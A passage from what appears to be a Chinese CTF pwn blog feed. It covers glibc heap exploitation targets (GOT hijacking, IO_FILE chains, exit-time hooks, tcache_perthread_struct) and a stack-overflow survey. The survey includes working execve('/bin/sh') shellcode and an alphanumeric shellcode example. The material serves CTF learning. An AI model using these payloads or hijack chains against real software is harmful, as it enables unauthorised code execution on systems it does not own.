class="line">.got.plt:<span class="number">00000000001</span>ED120 off_1ED120      dq offset __wmemchr_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED120                                         ; DATA XREF: j___wmemchr_ifunc_0↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED120                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED128 off_1ED128      dq offset __stpncpy_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED128                                         ; DATA XREF: j___stpncpy_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED128                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED130 off_1ED130      dq offset __wcscmp_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED130                                         ; DATA XREF: j___wcscmp_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED130                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED138 off_1ED138      dq offset __libc_memmove_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED138                                         ; DATA XREF: j___libc_memmove_ifunc_0↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED138                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED140 off_1ED140      dq offset strrchr_ifunc ; DATA XREF: j_strrchr_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED140                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED148 off_1ED148      dq offset strchr_ifunc  ; DATA XREF: j_strchr_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED148                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED150 off_1ED150      dq offset __wcschr_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED150                                         ; DATA XREF: j___wcschr_ifunc_0↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED150                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED158 off_1ED158      dq offset __new_memcpy_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED158                                         ; DATA XREF: j___new_memcpy_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED158                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED160 off_1ED160      dq offset _dl_rtld_di_serinfo</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED160                                         ; DATA XREF: __dl_rtld_di_serinfo↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED168 off_1ED168      dq offset _dl_allocate_tls</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED168                                         ; DATA XREF: __dl_allocate_tls↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED170 off_1ED170      dq offset __tunable_get_val</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED170                                         ; DATA XREF: ___tunable_get_val↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED178 off_1ED178      dq offset __wcslen_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED178                                         ; DATA XREF: j___wcslen_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED178                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED180 off_1ED180      dq offset memset_ifunc  ; DATA XREF: j_memset_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED180                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED188 off_1ED188      dq offset __wcsnlen_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED188                                         ; DATA XREF: j___wcsnlen_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED188                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED190 off_1ED190      dq offset strcmp_ifunc  ; DATA XREF: j_strcmp_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED190                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED198 off_1ED198      dq offset _dl_allocate_tls_init</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED198                                         ; DATA XREF: __dl_allocate_tls_init↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED1A0 off_1ED1A0      dq offset __nptl_change_stack_perm</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED1A0                                         ; DATA XREF: ___nptl_change_stack_perm↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED1A8 off_1ED1A8      dq offset strpbrk_ifunc ; DATA XREF: j_strpbrk_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED1A8                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED1B0 off_1ED1B0      dq offset __strnlen_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED1B0                                         ; DATA XREF: j___strnlen_ifunc_0↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED1B0 _got_plt        ends                    ; Indirect relocation</span><br></pre></td></tr></table></figure><p>可以看到got表中包含了很多字符串和内存相关函数，包括strlen等，为什么strlen这种在libc中实现的函数会需要走got表呢？</p><p>笔者在glibc2.34的源代码中进行了查找:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// string/string.h</span></span><br><span class="line"><span class="comment">/* Return the length of S.  */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">size_t</span> <span class="title function_">strlen</span> <span class="params">(<span class="type">const</span> <span class="type">char</span> *__s)</span></span><br><span class="line">     __THROW __attribute_pure__ __<span class="title function_">nonnull</span> <span class="params">((<span class="number">1</span>))</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /sysdeps/alpha/strlen.S</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line">ENTRY(<span class="built_in">strlen</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PROF</span></span><br><span class="line">ldgpgp, <span class="number">0</span>(pv)</span><br><span class="line">ldaAT, _mcount</span><br><span class="line">jsrAT, (AT), _mcount</span><br><span class="line">.prologue <span class="number">1</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">.prologue <span class="number">0</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">ldq_u   t0, <span class="number">0</span>(a0)<span class="meta"># load first quadword (a0 may be misaligned)</span></span><br><span class="line">lda     t1, <span class="number">-1</span>(zero)</span><br><span class="line">insqh   t1, a0, t1</span><br><span class="line">andnot  a0, <span class="number">7</span>, v0</span><br><span class="line">or      t1, t0, t0</span><br><span class="line">nop<span class="meta"># dual issue the next two on ev5</span></span><br><span class="line">cmpbge  zero, t0, t1# t1 &lt;- bitmask: bit i == <span class="number">1</span> &lt;==&gt; i-th byte == <span class="number">0</span></span><br><span class="line">bne     t1, $found</span><br><span class="line"></span><br><span class="line">$loop:ldq     t0, <span class="number">8</span>(v0)</span><br><span class="line">addq    v0, <span class="number">8</span>, v0<span class="meta"># addr += 8</span></span><br><span class="line">cmpbge  zero, t0, t1</span><br><span class="line">beq     t1, $loop</span><br><span class="line"></span><br><span class="line">$found:negq    t1, t2<span class="meta"># clear all but least set bit</span></span><br><span class="line">and     t1, t2, t1</span><br><span class="line"></span><br><span class="line">and     t1, <span class="number">0xf0</span>, t2<span class="meta"># binary search for that set bit</span></span><br><span class="line">andt1, <span class="number">0xcc</span>, t3</span><br><span class="line">andt1, <span class="number">0xaa</span>, t4</span><br><span class="line">cmovnet2, <span class="number">4</span>, t2</span><br><span class="line">cmovnet3, <span class="number">2</span>, t3</span><br><span class="line">cmovnet4, <span class="number">1</span>, t4</span><br><span class="line">addqt2, t3, t2</span><br><span class="line">addqv0, t4, v0</span><br><span class="line">addqv0, t2, v0</span><br><span class="line">nop<span class="meta"># dual issue next two on ev4 and ev5</span></span><br><span class="line"></span><br><span class="line">subq    v0, a0, v0</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">END(<span class="built_in">strlen</span>)</span><br><span class="line">libc_hidden_builtin_def (<span class="built_in">strlen</span>)</span><br></pre></td></tr></table></figure><p>发现在strings.h中，strlen是作为extern函数被引入的，然后发现其真正的实现是在其他文件中通过汇编实现的。</p><p>笔者猜测对于glibc对于strlen这种常用操作使用汇编编写来加快执行速度，也因此将其变成了extern 变量。</p><p>由于不是很了解编译过程的实现，笔者暂时还无法对此给出完美的解释，因此先在此按下不表，等待之后的深入研究。</p><p>而在ctf题中，最常劫持的got表也是strlen，因为其会在puts中被调用，很容易被用到。</p><p>同时，在house of pig的攻击流程中，可以将malloc@got作为malloc_hook的替代。</p><p>其优点在于像hooks一样劫持方便，只需要libc地址加一次任意分配即可，缺点在与其利用存在限制，并不是所有程序都会用到got表中的函数</p><h3 id="IO-FILE">IO_FILE</h3><p>在高版本的IO_FILE攻击主要是以下几条利用链(实际上大同小异)，基本上都是通过IO_clean_up来劫持控制流</p><ul><li>house of apple 2/house of cat: <code>_IO_wide_data</code><ul><li>主打一个简单方便</li></ul></li><li>house of kiwi: <code>_IO_file_jumps</code><ul><li>缺点在于_IO_file_jumps在一些版本里是不可写的，而且2.36修改了__malloc_assert</li></ul></li><li>house of emma: <code>_IO_cookie_jumps</code></li></ul><h3 id="exit">exit()</h3><ul><li><strong>rtld_global</strong><br>基本上就是house of banana的攻击流程，缺点是ld的加载基址不确定，需要爆破，优点是只需要一次large bin attack即可。</li><li><strong>dtor_list</strong><br>通过call_tls_dtors()来劫持控制流，但是需要劫持TCB.pointer_guard</li></ul><h2 id="辅助攻击">辅助攻击</h2><h3 id="tcache-perthread-struct">tcache_perthread_struct</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">uint16_t</span> counts[TCACHE_MAX_BINS]; <span class="comment">// 2*0x40 = 0x80</span></span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS]; <span class="comment">// 8*0x40 = 0x200</span></span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"><span class="comment">// 0x20+0x10*0x40 = 0x420  </span></span><br></pre></td></tr></table></figure><p>tcache_perthread_struct 是tcache的管理机构，也存在于堆中，如果想办法控制此结构体，即可控制tcache任意分配。<br>在glibc2.30以下的版本，counts的类型是char，此结构大小是0x250。</p><p>一般是作为辅助攻击的方法，可以简化攻击链。</p><h4 id="example">example</h4><p>[[2021-DownUnder-note]]</p><h3 id="global-max-fast">global_max_fast</h3><p>实际上就是house of corrison的利用，类似的，tcache也有类似的利用。使得大chunk被当作tcache处理。</p><h3 id="heap-info">heap_info</h3><p>直接攻击堆管理结构体，可以看看这篇帖子:<a href="http://phrack.org/issues/66/10.html">house-of-mind</a><br>#TODO</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;Basic Knowledge&lt;/h1&gt;
&lt;h6 id=&quot;bins&quot;&gt;bins:&lt;/h6&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;unsorted bin&lt;/th&gt;
&lt;th&gt;fast bin&lt;/th&gt;
&lt;th&gt;small bin&lt;/th&gt;
&lt;th&gt;large </summary>
      
    
    
    
    <category term="CTF" scheme="http://v3rdant.cn/categories/CTF/"/>
    
    
    <category term="Pwn" scheme="http://v3rdant.cn/tags/Pwn/"/>
    
    <category term="CTF" scheme="http://v3rdant.cn/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>PWN-StackOverflow-Overview</title>
    <link href="http://v3rdant.cn/2022/08/03/[Pwn]-StackOverflow-Overview/"/>
    <id>http://v3rdant.cn/2022/08/03/[Pwn]-StackOverflow-Overview/</id>
    <published>2022-08-02T16:00:00.000Z</published>
    <updated>2023-06-20T07:30:02.067Z</updated>
    
    <content type="html"><![CDATA[<h3 id="杂谈">杂谈</h3><p>作为一种基本的漏洞，栈溢出在CTF中出现的非常频繁，因为其多样化的利用形式，难以进行系统的归类，本文结合笔者个人的经验，综合讨论各种栈溢出技术，如果有遗漏，欢迎评论留言，或者给笔者发邮件，进行补充。</p><p>本文一定程度上参考了各种博客，CTF-wiki, CTF-All-in-One</p><p>怎么去看待栈溢出题呢?</p><p>尽管利用方法多样，但是，就笔者个人的看法而言，整个栈溢出实际上只分为三种:</p><p><strong>ret2syscall,  ret2libc,  ret2shellcode</strong></p><p>实际上应该还有ret2text， 然而实在过于简单，一般不会在ctf题目中出现。</p><p>一般而言，pwn题的目的都是<code>getshell</code>(当然，也有直接读取flag的，这个后面单独谈)，而<code>getshell</code> 无外乎就三种途径，<code>syscall</code>，<code>libc-system</code>，<code>shellcode</code></p><p>当拿到一个题目时，首先思考：</p><p>是否有syscall----&gt;ret2syscall</p><p>有可读可写内存空间吗----&gt;ret2shellcode</p><p>给了libc文件或者有信息泄露函数(IO函数)----&gt;ret2libc</p><p>接下来，再分门别类谈:</p><h3 id="0x1-ret2syscall">0x1.ret2syscall</h3><p>因为syscall属于相对简单的，暂且放在前面谈。</p><table><thead><tr><th style="text-align:left">%rax</th><th style="text-align:left">System call</th><th style="text-align:left">%rdi</th><th style="text-align:left">%rsi</th><th style="text-align:left">%rdx</th><th style="text-align:left">%r10</th><th style="text-align:left">%r8</th><th style="text-align:left">%r9</th></tr></thead><tbody><tr><td style="text-align:left">59</td><td style="text-align:left">sys_execve</td><td style="text-align:left">const char *filename</td><td style="text-align:left">const char *const argv[]</td><td style="text-align:left">const char *const envp[]</td><td style="text-align:left"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr></tbody></table><p>一般而言，需要<code>syscall</code>的题目中，都是构造这个系统调用实现。</p><p>而在一些题目中通过<code>seccomp</code>禁用了<code>execve</code>的调用，所以不能直接利用，那么就利用open, read,  write 直接读取flag文件，也是一种办法。</p><p>而在syscall中，最为重要也是最麻烦的一步，就是在哪个地址写入/bin/sh（如果本地文件没有/bin/sh的话），一般而言，有三个选择，.data, .bss， 栈上。</p><p>在没开PIE的程序中，可以考虑通过write写入.data段或者买.bss段。</p><p>或者考虑通过rsp获取栈上地址，或者partial overwrite带出栈上地址。</p><p>总的而言，就是选择能够获取到地址的地方写入/bin/sh。</p><p><strong>例题:</strong></p><p>ciscn_s_3</p><h3 id="ret2shellcode">ret2shellcode</h3><h4 id="shellcode的书写">shellcode的书写</h4><p>一般而言，可以直接通过pwntools 相应模块直接生成shellcode，然而现在以shellcode为考点的题目，一般都会对shellcode做出限制，诸如不能包含可打印字符等等。所以尽可能自己熟悉shellcode的书写。</p><p>一个简单的shellcode例子:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// execve(path = &#x27;/bin///sh&#x27;, argv = [&#x27;sh&#x27;], envp = 0)</span></span><br><span class="line">push <span class="number">0x68</span></span><br><span class="line">mov rax, <span class="number">0x732f2f2f6e69622f</span></span><br><span class="line">push rax</span><br><span class="line">mov rdi, rsp</span><br><span class="line"><span class="comment">// push argument array [&#x27;sh\x00&#x27;]</span></span><br><span class="line"><span class="comment">// push b&#x27;sh\x00&#x27; </span></span><br><span class="line">push <span class="number">0x1010101</span> ^ <span class="number">0x6873</span></span><br><span class="line">xor dword ptr [rsp], <span class="number">0x1010101</span></span><br><span class="line">xor esi, esi <span class="comment">/* 0 */</span></span><br><span class="line">push rsi <span class="comment">/* null terminate */</span></span><br><span class="line">push <span class="number">8</span></span><br><span class="line">pop rsi</span><br><span class="line">add rsi, rsp</span><br><span class="line">push rsi <span class="comment">/* &#x27;sh\x00&#x27; */</span></span><br><span class="line">mov rsi, rsp</span><br><span class="line">xor edx, edx <span class="comment">/* 0 */</span></span><br><span class="line"><span class="comment">// call execve()</span></span><br><span class="line">push SYS_execve <span class="comment">/* 0x3b */</span></span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>这里获取<code>/bin/sh</code>地址的方式，是将其压入栈中，再通过rsp偏移获取相应地址。</p><p>不过一般而言，pwn题目运行shellcode，一般是采用寄存器跳转，即<code>jmp  rax</code>此类，那么其实可以通过跳转寄存器获取shellcode存放地址，并且将/bin/sh直接镶入shellcode后面，简化shellcode书写。</p><p>同时，有些题目会对shellcode有所限制，限制只能包含可打印字符或者纯粹字母数字。这就限制了shellcode的书写，<code>mov</code>和<code>syscall</code>都会遭到限制， 可用指令如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>数据传送:</span><br><span class="line">push/pop eax…</span><br><span class="line">pusha/popa</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>算术运算:</span><br><span class="line">inc/dec eax…</span><br><span class="line">sub al, 立即数</span><br><span class="line">sub byte ptr [eax… + 立即数], al dl…</span><br><span class="line">sub byte ptr [eax… + 立即数], ah dh…</span><br><span class="line">sub dword ptr [eax… + 立即数], esi edi</span><br><span class="line">sub word ptr [eax… + 立即数], si di</span><br><span class="line">sub al dl…, byte ptr [eax… + 立即数]</span><br><span class="line">sub ah dh…, byte ptr [eax… + 立即数]</span><br><span class="line">sub esi edi, dword ptr [eax… + 立即数]</span><br><span class="line">sub si di, word ptr [eax… + 立即数]</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>逻辑运算:</span><br><span class="line">and al, 立即数</span><br><span class="line">and dword ptr [eax… + 立即数], esi edi</span><br><span class="line">and word ptr [eax… + 立即数], si di</span><br><span class="line">and ah dh…, byte ptr [ecx edx… + 立即数]</span><br><span class="line">and esi edi, dword ptr [eax… + 立即数]</span><br><span class="line">and si di, word ptr [eax… + 立即数]</span><br><span class="line"></span><br><span class="line">xor al, 立即数</span><br><span class="line">xor byte ptr [eax… + 立即数], al dl…</span><br><span class="line">xor byte ptr [eax… + 立即数], ah dh…</span><br><span class="line">xor dword ptr [eax… + 立即数], esi edi</span><br><span class="line">xor word ptr [eax… + 立即数], si di</span><br><span class="line">xor al dl…, byte ptr [eax… + 立即数]</span><br><span class="line">xor ah dh…, byte ptr [eax… + 立即数]</span><br><span class="line">xor esi edi, dword ptr [eax… + 立即数]</span><br><span class="line">xor si di, word ptr [eax… + 立即数]</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>比较指令:</span><br><span class="line">cmp al, 立即数</span><br><span class="line">cmp byte ptr [eax… + 立即数], al dl…</span><br><span class="line">cmp byte ptr [eax… + 立即数], ah dh…</span><br><span class="line">cmp dword ptr [eax… + 立即数], esi edi</span><br><span class="line">cmp word ptr [eax… + 立即数], si di</span><br><span class="line">cmp al dl…, byte ptr [eax… + 立即数]</span><br><span class="line">cmp ah dh…, byte ptr [eax… + 立即数]</span><br><span class="line">cmp esi edi, dword ptr [eax… + 立即数]</span><br><span class="line">cmp si di, word ptr [eax… + 立即数]</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>转移指令:</span><br><span class="line">push <span class="number">56</span>h</span><br><span class="line">pop eax</span><br><span class="line">cmp al, <span class="number">43</span>h</span><br><span class="line">jnz lable</span><br><span class="line"></span><br><span class="line">&lt;=&gt; jmp lable</span><br><span class="line"></span><br><span class="line"><span class="number">6.</span>交换al, ah</span><br><span class="line">push eax</span><br><span class="line">xor ah, byte ptr [esp] <span class="comment">// ah ^= al</span></span><br><span class="line">xor byte ptr [esp], ah <span class="comment">// al ^= ah</span></span><br><span class="line">xor ah, byte ptr [esp] <span class="comment">// ah ^= al</span></span><br><span class="line">pop eax</span><br><span class="line"></span><br><span class="line"><span class="number">7.</span>清零:</span><br><span class="line">push <span class="number">44</span>h</span><br><span class="line">pop eax</span><br><span class="line">sub al, <span class="number">44</span>h ; eax = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">push esi</span><br><span class="line">push esp</span><br><span class="line">pop eax</span><br><span class="line">xor [eax], esi ; esi = <span class="number">0</span></span><br></pre></td></tr></table></figure><p>一般而言,  我们采用<code>xor</code>或者<code>sub</code>指令修改shellcode后面的值，构造<code>0f 05</code>， 实现syscall。</p><p>一个例子(纯字母数字shellcode):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ref: https://hama.hatenadiary.jp/entry/2017/04/04/190129</span></span><br><span class="line"><span class="comment">/* from call rax */</span></span><br><span class="line">push rax</span><br><span class="line">push rax</span><br><span class="line">pop rcx</span><br><span class="line"></span><br><span class="line"><span class="comment">/* XOR pop rsi, pop rdi, syscall */</span></span><br><span class="line">push <span class="number">0x41413030</span></span><br><span class="line">pop rax</span><br><span class="line">xor DWORD PTR [rcx+<span class="number">0x30</span>], eax</span><br><span class="line"></span><br><span class="line"><span class="comment">/* XOR /bin/sh */</span></span><br><span class="line">push <span class="number">0x34303041</span></span><br><span class="line">pop rax</span><br><span class="line">xor DWORD PTR [rcx+<span class="number">0x34</span>], eax</span><br><span class="line">push <span class="number">0x41303041</span></span><br><span class="line">pop rax</span><br><span class="line">xor DWORD PTR [rcx+<span class="number">0x38</span>], eax</span><br><span class="line"></span><br><span class="line"><span class="comment">/* rdi = &amp;&#x27;/bin/sh&#x27; */</span></span><br><span class="line">push rcx</span><br><span class="line">pop rax</span><br><span class="line">xor al, <span class="number">0x34</span></span><br><span class="line">push rax</span><br><span class="line"></span><br><span class="line"><span class="comment">/* rdx = 0 */</span></span><br><span class="line">push <span class="number">0x30</span></span><br><span class="line">pop rax</span><br><span class="line">xor al, <span class="number">0x30</span></span><br><span class="line">push rax</span><br><span class="line">pop rdx</span><br><span class="line"></span><br><span class="line">push rax</span><br><span class="line"></span><br><span class="line"><span class="comment">/* rax = 59 (SYS_execve) */</span></span><br><span class="line">push <span class="number">0x41</span></span><br><span class="line">pop rax</span><br><span class="line">xor al, <span class="number">0x7a</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* pop rsi, pop rdi*/</span></span><br><span class="line"><span class="comment">/* syscall */</span> </span><br><span class="line">.byte <span class="number">0x6e</span></span><br><span class="line">.byte <span class="number">0x6f</span></span><br><span class="line">.byte <span class="number">0x4e</span></span><br><span class="line">.byte <span class="number">0x44</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* /bin/sh */</span></span><br><span class="line">.byte <span class="number">0x6e</span></span><br><span class="line">.byte <span class="number">0x52</span></span><br><span class="line">.byte <span class="number">0x59</span></span><br><span class="line">.byte <span class="number">0x5a</span></span><br><span class="line">.byte <span class="number">0x6e</span></span><br><span class="line">.byte <span class="number">0x43</span></span><br><span class="line">.byte <span class="number">0x5a</span></span><br><span class="line">.byte <span class="number">0x41</span></span><br></pre></td></tr></table></figure><p>构造尽可能短的shellcode可能用到的一些指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cdp  </span><br><span class="line">%The CDQ instruction copies the sign (bit 31) </span><br><span class="line">%of the value in the EAX register into every bit </span><br><span class="line">%position in the EDX register. </span><br></pre></td></tr></table></figure><h4 id="shellcode生成工具">shellcode生成工具</h4><p>同时，现在有多种针对shellcode进行编码的生成工具，生成符合限制的shellcode，如msf，alpha3等等，由于我没有用过，可以自行尝试。</p><h4 id="mprotect">mprotect()</h4><p>进一步的，很多题目没有天然的readable  and  executable segment，题目可能通过mmap()映射了一段权限为7的段，或者存在mprotect()函数。</p><p>这个函数可以修改指定内存段的权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mprotect:</span><br><span class="line">int mprotect(void *addr, size_t len, int prot);</span><br><span class="line">addr 内存起始地址</span><br><span class="line">len  修改内存的长度</span><br><span class="line">prot 内存的权限，7为可读可写可执行</span><br></pre></td></tr></table></figure><p>如果存在这样的函数，可以考虑将其加入ROP链，从而进一步调用shellcode</p><h3 id="ret2libc">ret2libc</h3><h4 id="leak-libc">leak_libc</h4><p>对于最后调用 libc 中 system 的题目而言，需要考虑的首要问题就是leak_libc.</p><p>目前而言，我遇到的栈题中leak_libc，有两种方法：</p><ol><li>partial_overwrite<br>有时候，在栈中会存留libc中地址，在后面存在直接输出的函数的情况下，可以带出此地址。</li><li>通过puts，write等函数，打印<code>.got</code>，获取对应函数的地址，这里，在没有给定对应libc版本的情况下，也可以通过LibcSearcher查找对应libc版本</li></ol><figure class="highlight python"><table><tr><td 